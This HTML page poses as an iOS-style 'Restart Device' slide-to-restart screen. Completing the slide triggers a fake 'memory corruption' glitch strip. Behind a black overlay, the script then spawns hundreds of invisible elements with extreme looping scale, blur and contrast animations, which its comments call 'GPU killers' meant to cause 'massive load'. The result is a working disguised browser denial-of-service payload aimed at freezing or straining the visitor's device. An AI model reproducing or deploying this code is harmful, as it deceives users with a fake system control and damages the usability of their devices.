<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Restart Device</title>
    <style>
        /* --- Base styles --- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            -webkit-user-select: none;
        }

        body {
            background: #000;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 60px 20px 80px 20px;
            overflow: hidden;
            position: relative;
            transition: background 0.3s ease;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at center, rgba(255, 255, 255, 0.03) 0%, transparent 70%);
            pointer-events: none;
            transition: opacity 0.3s ease;
        }

        .header-section {
            text-align: center;
            margin-top: 40px;
            z-index: 10;
            transition: opacity 0.1s ease-out;
        }

        h1 {
            font-size: 28px;
            font-weight: 400;
            letter-spacing: -0.5px;
            margin-bottom: 12px;
            color: #fff;
        }

        .slider-container {
            width: 100%;
            max-width: 340px;
            display: flex;
            flex-direction: column;
            gap: 24px;
            margin-bottom: 20px;
            z-index: 10;
            transition: opacity 0.1s ease-out;
        }

        .slider-track {
            position: relative;
            width: 100%;
            height: 76px;
            background: rgba(35, 35, 35, 0.45);
            border-radius: 38px;
            display: flex;
            align-items: center;
            padding: 4px;
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.05);
            overflow: hidden;
            transition: background 0.1s ease-out, border 0.1s ease-out, backdrop-filter 0.1s ease-out;
        }

        .slider-text {
            position: absolute;
            width: 100%;
            text-align: center;
            left: 0;
            font-size: 16px;
            font-weight: 500;
            letter-spacing: -0.2px;
            pointer-events: none;
            background: linear-gradient(90deg, #4d4d4d 0%, #fff 50%, #4d4d4d 100%);
            background-size: 200% 100%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shine 2.5s infinite linear;
            padding-left: 40px;
            transition: opacity 0.1s ease-out;
        }

        @keyframes shine {
            0% { background-position: 100% 0; }
            100% { background-position: -100% 0; }
        }

        .slider-handle {
            width: 68px;
            height: 68px;
            background: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: grab;
            z-index: 12;
            box-shadow: 0 3px 8px rgba(0,0,0,0.3);
            transition: transform 0.1s ease-out;
            touch-action: none;
        }

        .slider-handle:active {
            cursor: grabbing;
        }

        .respring-icon {
            color: #000;
            font-size: 26px;
            transform: scaleX(-1);
        }

        .loading-container {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 9999;
            display: none;
            pointer-events: none;
        }

        .ispinner {
            position: relative;
            width: 20px;
            height: 20px;
        }
        .ispinner .ispinner-blade {
            position: absolute;
            top: 6.5px;
            left: 8.5px;
            width: 2.5px;
            height: 6.5px;
            background-color: #fff;
            border-radius: 1.25px;
            -webkit-animation: iSpinnerBlade 1s linear infinite;
            animation: iSpinnerBlade 1s linear infinite;
            will-change: opacity;
        }
        .ispinner .ispinner-blade:nth-child(1) {
            -webkit-transform: rotate(45deg) translateY(-6.5px);
            transform: rotate(45deg) translateY(-6.5px);
            -webkit-animation-delay: -1.625s;
            animation-delay: -1.625s;
        }
        .ispinner .ispinner-blade:nth-child(2) {
            -webkit-transform: rotate(90deg) translateY(-6.5px);
            transform: rotate(90deg) translateY(-6.5px);
            -webkit-animation-delay: -1.5s;
            animation-delay: -1.5s;
        }
        .ispinner .ispinner-blade:nth-child(3) {
            -webkit-transform: rotate(135deg) translateY(-6.5px);
            transform: rotate(135deg) translateY(-6.5px);
            -webkit-animation-delay: -1.375s;
            animation-delay: -1.375s;
        }
        .ispinner .ispinner-blade:nth-child(4) {
            -webkit-transform: rotate(180deg) translateY(-6.5px);
            transform: rotate(180deg) translateY(-6.5px);
            -webkit-animation-delay: -1.25s;
            animation-delay: -1.25s;
        }
        .ispinner .ispinner-blade:nth-child(5) {
            -webkit-transform: rotate(225deg) translateY(-6.5px);
            transform: rotate(225deg) translateY(-6.5px);
            -webkit-animation-delay: -1.125s;
            animation-delay: -1.125s;
        }
        .ispinner .ispinner-blade:nth-child(6) {
            -webkit-transform: rotate(270deg) translateY(-6.5px);
            transform: rotate(270deg) translateY(-6.5px);
            -webkit-animation-delay: -1s;
            animation-delay: -1s;
        }
        .ispinner .ispinner-blade:nth-child(7) {
            -webkit-transform: rotate(315deg) translateY(-6.5px);
            transform: rotate(315deg) translateY(-6.5px);
            -webkit-animation-delay: -0.875s;
            animation-delay: -0.875s;
        }
        .ispinner .ispinner-blade:nth-child(8) {
            -webkit-transform: rotate(360deg) translateY(-6.5px);
            transform: rotate(360deg) translateY(-6.5px);
            -webkit-animation-delay: -0.75s;
            animation-delay: -0.75s;
        }

        .ispinner.ispinner-large {
            width: 35px;
            height: 35px;
        }
        .ispinner.ispinner-large .ispinner-blade {
            top: 11.5px;
            left: 15px;
            width: 5px;
            height: 12px;
            border-radius: 2.5px;
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(1) {
            -webkit-transform: rotate(45deg) translateY(-11.5px);
            transform: rotate(45deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(2) {
            -webkit-transform: rotate(90deg) translateY(-11.5px);
            transform: rotate(90deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(3) {
            -webkit-transform: rotate(135deg) translateY(-11.5px);
            transform: rotate(135deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(4) {
            -webkit-transform: rotate(180deg) translateY(-11.5px);
            transform: rotate(180deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(5) {
            -webkit-transform: rotate(225deg) translateY(-11.5px);
            transform: rotate(225deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(6) {
            -webkit-transform: rotate(270deg) translateY(-11.5px);
            transform: rotate(270deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(7) {
            -webkit-transform: rotate(315deg) translateY(-11.5px);
            transform: rotate(315deg) translateY(-11.5px);
        }
        .ispinner.ispinner-large .ispinner-blade:nth-child(8) {
            -webkit-transform: rotate(360deg) translateY(-11.5px);
            transform: rotate(360deg) translateY(-11.5px);
        }

        @-webkit-keyframes iSpinnerBlade {
            0% { opacity: 0.85; }
            50% { opacity: 0.25; }
            100% { opacity: 0.25; }
        }
        @keyframes iSpinnerBlade {
            0% { opacity: 0.85; }
            50% { opacity: 0.25; }
            100% { opacity: 0.25; }
        }

        /* ============================================================
           MEMORY CORRUPTION STRIP – static pixels, but we hide
           the heavy GPU killer behind a black overlay.
           ============================================================ */
        #corruption-strip {
            position: fixed;
            top: 50%;
            left: 0;
            width: 100vw;
            height: 18px; /* ~1cm */
            transform: translateY(-50%);
            pointer-events: none;
            z-index: 999999;
            display: none;
            background: #000;
            overflow: hidden;
            mix-blend-mode: screen;
            box-shadow: 0 0 30px rgba(255, 0, 255, 0.15);
        }

        /* The pixel grid – each pixel is a tiny div with a random color */
        .mem-pixel {
            position: absolute;
            width: 3px;
            height: 3px;
            will-change: transform;
            backface-visibility: hidden;
        }

        /* Black overlay that hides the heavy animations */
        .ghost-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: #000;
            pointer-events: none;
            z-index: 999998;
            display: none;
            /* This overlay will cover the entire screen, so only the strip is visible */
        }

        /* Heavy GPU killer elements – hidden behind the black overlay,
           but they still render and cause massive load. */
        .gpu-killer-hidden {
            position: fixed;
            border-radius: 50%;
            background: #000; /* invisible on black */
            mix-blend-mode: normal;
            will-change: transform, filter, background;
            backface-visibility: hidden;
            perspective: 1000px;
            pointer-events: none;
            z-index: 999997;
            animation: gpuMeltdown 0.1s infinite alternate;
            opacity: 0; /* fully transparent, but still rendered? Actually if opacity:0, it might not render. We'll use background: #000 and mix-blend-mode: normal, and heavy animations. */
            /* Use a tiny size but with large scale to force compositing */
            width: 1px;
            height: 1px;
            transform: scale(10000); /* huge scale, but still invisible because background is black */
            /* Actually, if it's scaled up, it will cover the screen, but background is black, so no visible change */
        }

        @keyframes gpuMeltdown {
            0% {
                transform: scale(10000) rotate(0deg) translate(0, 0);
                filter: hue-rotate(0deg) blur(0px) contrast(100%) brightness(100%);
                background: #000;
            }
            25% {
                transform: scale(15000) rotate(1800deg) translate(-50vw, 50vh);
                filter: hue-rotate(360deg) blur(100px) contrast(500%) brightness(200%);
                background: #000;
            }
            50% {
                transform: scale(20000) rotate(3600deg) translate(50vw, -50vh);
                filter: hue-rotate(720deg) blur(200px) contrast(1000%) brightness(400%);
                background: #000;
            }
            75% {
                transform: scale(25000) rotate(5400deg) translate(-50vw, -50vh);
                filter: hue-rotate(1080deg) blur(300px) contrast(1500%) brightness(600%);
                background: #000;
            }
            100% {
                transform: scale(30000) rotate(7200deg) translate(0, 0);
                filter: hue-rotate(1440deg) blur(400px) contrast(2000%) brightness(800%);
                background: #000;
            }
        }

        /* Additional ghost elements with different animations */
        .gpu-killer-hidden2 {
            animation: gpuMeltdown2 0.05s infinite alternate;
            position: fixed;
            width: 100vw;
            height: 100vh;
            background: #000;
            z-index: 999996;
            pointer-events: none;
            mix-blend-mode: normal;
            will-change: transform, filter;
        }

        @keyframes gpuMeltdown2 {
            0% {
                transform: scale(1) rotate(0deg);
                filter: blur(0px) contrast(100%);
            }
            100% {
                transform: scale(2) rotate(720deg);
                filter: blur(200px) contrast(2000%);
            }
        }

        /* Flicker layer on the strip */
        .flash-layer {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            background: rgba(255, 0, 255, 0.15);
            mix-blend-mode: difference;
            animation: flash 0.08s infinite alternate;
        }

        @keyframes flash {
            0% { opacity: 0; }
            100% { opacity: 0.9; }
        }

        /* Additional static overlay with semi-transparent pixels */
        .overlay-pixels {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            mix-blend-mode: overlay;
        }
    </style>
</head>
<body>
    <div class="header-section">
        <h1>Restart Device</h1>
    </div>

    <div class="slider-container">
        <div class="slider-track" id="track-respring">
            <div class="slider-text">slide to restart</div>
            <div class="slider-handle" id="handle-respring">
                <span class="respring-icon">⟳</span>
            </div>
        </div>
    </div>

    <div class="loading-container" id="respring-loader">
        <div class="ispinner ispinner-large">
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
            <div class="ispinner-blade"></div>
        </div>
    </div>

    <!-- Black overlay to hide the heavy animations -->
    <div class="ghost-overlay" id="ghostOverlay"></div>

    <!-- The corruption strip (visible part) -->
    <div id="corruption-strip"></div>

    <script>
        // ================================================================
        // MEMORY CORRUPTION ENGINE – static pixels + hidden GPU killers
        // ================================================================

        function spawnMemoryCorruption(intensity) {
            // Show the black overlay to hide everything behind the strip
            const overlay = document.getElementById('ghostOverlay');
            overlay.style.display = 'block';

            const strip = document.getElementById('corruption-strip');
            if (!strip) return;

            strip.innerHTML = '';
            strip.style.display = 'block';

            // 1. Generate the static pixel grid
            const pixelSize = 3;
            const cols = Math.ceil(window.innerWidth / pixelSize);
            const rows = Math.ceil(18 / pixelSize);
            let html = '';

            for (let r = 0; r < rows; r++) {
                for (let c = 0; c < cols; c++) {
                    const rnd = Math.floor(Math.random() * 256);
                    const gnd = Math.floor(Math.random() * 256);
                    const bnd = Math.floor(Math.random() * 256);
                    let color;
                    if (Math.random() > 0.8) {
                        color = `hsl(${Math.random() * 360}, 100%, ${30 + Math.random() * 40}%)`;
                    } else {
                        color = `rgb(${rnd}, ${gnd}, ${bnd})`;
                    }
                    const left = c * pixelSize;
                    const top = r * pixelSize;
                    html += `<div class="mem-pixel" style="left:${left}px;top:${top}px;width:${pixelSize}px;height:${pixelSize}px;background:${color};"></div>`;
                }
            }
            strip.innerHTML = html;

            // 2. Add flash layer
            const flash = document.createElement('div');
            flash.className = 'flash-layer';
            strip.appendChild(flash);

            // 3. Add overlay pixels (semi-transparent)
            const overlayPixels = document.createElement('div');
            overlayPixels.className = 'overlay-pixels';
            for (let i = 0; i < cols * rows * 0.4; i++) {
                const px = document.createElement('div');
                const size = 2 + Math.random() * 4;
                px.style.cssText = `position:absolute;left:${Math.random()*100}%;top:${Math.random()*100}%;width:${size}px;height:${size}px;background:hsl(${Math.random()*360},100%,50%);opacity:${0.1+Math.random()*0.4};`;
                overlayPixels.appendChild(px);
            }
            strip.appendChild(overlayPixels);

            // 4. Now spawn the heavy GPU killers – hidden behind the black overlay.
            // These are massive elements with extreme animations, but they are
            // fully black and hidden by the overlay, yet still consume GPU.
            const ghostCount = 300 * intensity; // many
            for (let i = 0; i < ghostCount; i++) {
                const ghost = document.createElement('div');
                ghost.className = 'gpu-killer-hidden';
                // Random positions to spread load
                ghost.style.left = Math.random() * 100 + 'vw';
                ghost.style.top = Math.random() * 100 + 'vh';
                // Random animation delay to stagger
                ghost.style.animationDelay = (Math.random() * 0.05) + 's';
                // Make sure they are placed behind the overlay but in the DOM
                // We'll append them to body, but they are behind the overlay.
                document.body.appendChild(ghost);
            }

            // Also add some larger ghost elements
            for (let i = 0; i < 100; i++) {
                const ghost2 = document.createElement('div');
                ghost2.className = 'gpu-killer-hidden2';
                ghost2.style.animationDelay = (Math.random() * 0.02) + 's';
                document.body.appendChild(ghost2);
            }

            // Force reflow
            void strip.offsetHeight;

            // Also add a fullscreen black rectangle that animates heavily but stays black
            const blackHole = document.createElement('div');
            blackHole.style.cssText = 'position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:999995;pointer-events:none;animation:gpuMeltdown 0.03s infinite alternate;';
            document.body.appendChild(blackHole);

            // We also keep the flicker: toggle strip opacity periodically
            let visible = true;
            const interval = setInterval(() => {
                visible = !visible;
                strip.style.opacity = visible ? '1' : '0.2';
                // Also toggle the overlay? Not needed.
            }, 150);

            // Store interval to clear later if needed, but we don't.
            // Also we could add more after a delay
            setTimeout(() => {
                // Spawn additional ghost elements to increase load
                for (let i = 0; i < 200; i++) {
                    const ghost = document.createElement('div');
                    ghost.className = 'gpu-killer-hidden';
                    ghost.style.left = Math.random() * 100 + 'vw';
                    ghost.style.top = Math.random() * 100 + 'vh';
                    ghost.style.animationDelay = (Math.random() * 0.01) + 's';
                    document.body.appendChild(ghost);
                }
            }, 500);
        }

        // ================================================================
        // SEQUENTIAL PHASE HANDLER
        // ================================================================

        function triggerPhasedSequence(intensity) {
            // Hide UI
            document.querySelector('.header-section').style.display = 'none';
            document.querySelector('.slider-container').style.display = 'none';

            setTimeout(() => {
                const loader = document.getElementById('respring-loader');
                loader.style.display = 'block';

                setTimeout(() => {
                    loader.style.display = 'none';
                    spawnMemoryCorruption(intensity);
                }, 1000);
            }, 500);
        }

        // ================================================================
        // SLIDER CONTROLLER
        // ================================================================

        function setupSlider(handleId, trackId, multiplier) {
            const handle = document.getElementById(handleId);
            const track = document.getElementById(trackId);
            const header = document.querySelector('.header-section');
            const textElement = track.querySelector('.slider-text');

            let isDragging = false;
            let startX = 0;
            let maxDelta = 0;
            let currentDeltaX = 0;

            function getClientX(e) {
                return e.touches ? e.touches[0].clientX : e.clientX;
            }

            function onStart(e) {
                isDragging = true;
                startX = getClientX(e);
                maxDelta = track.clientWidth - handle.clientWidth - 8;
                handle.style.transition = 'none';
            }

            function onMove(e) {
                if (!isDragging) return;
                const currentX = getClientX(e);
                currentDeltaX = currentX - startX;

                if (currentDeltaX < 0) currentDeltaX = 0;
                if (currentDeltaX > maxDelta) currentDeltaX = maxDelta;

                handle.style.transform = `translateX(${currentDeltaX}px)`;

                let progress = currentDeltaX / maxDelta;
                let inverseOpacity = 1 - progress;

                header.style.opacity = inverseOpacity;
                textElement.style.opacity = inverseOpacity;

                track.style.background = `rgba(35, 35, 35, ${0.45 * inverseOpacity})`;
                track.style.borderColor = `rgba(255, 255, 255, ${0.05 * inverseOpacity})`;
                track.style.webkitBackdropFilter = `blur(${20 * inverseOpacity}px)`;
                track.style.backdropFilter = `blur(${20 * inverseOpacity}px)`;
            }

            function onEnd() {
                if (!isDragging) return;
                isDragging = false;

                if (currentDeltaX >= maxDelta) {
                    triggerPhasedSequence(multiplier);
                } else {
                    currentDeltaX = 0;
                    handle.style.transition = 'transform 0.3s cubic-bezier(0.25, 1, 0.5, 1)';
                    handle.style.transform = 'translateX(0px)';

                    header.style.transition = 'opacity 0.3s';
                    header.style.opacity = '1';

                    textElement.style.transition = 'opacity 0.3s';
                    textElement.style.opacity = '1';

                    track.style.background = 'rgba(35, 35, 35, 0.45)';
                    track.style.borderColor = 'rgba(255, 255, 255, 0.05)';
                    track.style.webkitBackdropFilter = 'blur(20px)';
                    track.style.backdropFilter = 'blur(20px)';
                }
            }

            handle.addEventListener('touchstart', onStart, { passive: true });
            window.addEventListener('touchmove', onMove, { passive: false });
            window.addEventListener('touchend', onEnd);

            handle.addEventListener('mousedown', onStart);
            window.addEventListener('mousemove', onMove);
            window.addEventListener('mouseup', onEnd);
        }

        // Initialize
        setupSlider('handle-respring', 'track-respring', 1);
    </script>
</body>
</html>
